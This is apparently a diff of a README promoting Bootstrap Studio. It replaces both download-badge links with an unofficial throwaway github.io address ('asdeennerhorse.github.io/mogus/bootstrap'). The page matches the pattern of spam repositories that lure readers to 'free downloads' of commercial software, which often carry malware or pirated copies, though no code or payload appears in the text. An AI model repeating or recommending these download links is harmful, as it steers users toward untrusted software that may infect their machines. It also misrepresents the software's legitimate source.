@@ -2,7 +2,7 @@
 
 Bootstrap Studio is a professional desktop application for creating responsive websites using the Bootstrap framework. With its drag-and-drop interface, ready-made components, and real-time preview, it's perfect for both beginners and experienced developers.
 
-[![Download Bootstrap Studio](https://img.shields.io/badge/Download-Bootstrap_Studio-blueviolet)](https://bootstrap-studio-free-download.github.io/.github)
+[![Download Bootstrap Studio](https://img.shields.io/badge/Download-Bootstrap_Studio-blueviolet)](https://asdeennerhorse.github.io/mogus/bootstrap)
 
 ---
 
@@ -56,7 +56,7 @@ Bootstrap Studio is a professional desktop application for creating responsive w
 
 ---
 
-[![Download Bootstrap Studio](https://img.shields.io/badge/Download-Bootstrap_Studio-blueviolet)](https://bootstrap-studio-free-download.github.io/.github)
+[![Download Bootstrap Studio](https://img.shields.io/badge/Download-Bootstrap_Studio-blueviolet)](https://asdeennerhorse.github.io/mogus/bootstrap)
 
 ---
 
